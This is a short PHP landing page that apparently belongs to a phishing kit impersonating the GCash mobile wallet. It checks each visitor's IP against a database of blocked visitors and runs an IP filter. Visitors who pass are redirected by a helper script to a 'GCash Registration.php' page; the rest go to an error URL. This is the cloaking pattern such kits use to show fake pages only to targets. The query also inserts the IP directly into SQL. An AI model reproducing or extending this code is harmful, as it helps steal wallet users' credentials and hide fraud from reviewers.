<?php
define("IN_DEX", "true");
include('zy/api/mysql.php');
index("1");
$ip = php_ip();
$a = mysql_sql("select * from " . DB . ".user where ip='{$ip}';");
if ($a && $a[0]["jzfw"] == "2") {
    yc(505);
}
if (ipxz()) { ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover">
        <meta name="spm-id" content="875">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="renderer" content="webkit">
        <link rel="shortcut icon" href="img/ico.ico">
        <title>staited</title>
    </head>

    </html>
    <script type="text/javascript" src="zy/api/k.js"></script>
    <script>
        y("GCash Registration.php");

    </script>
<?php
} else {
    err(); ?>
    <script type="text/javascript" src="zy/api/k.js"></script>
    <script>
        y(errurl);
    </script>
<?php
}
?>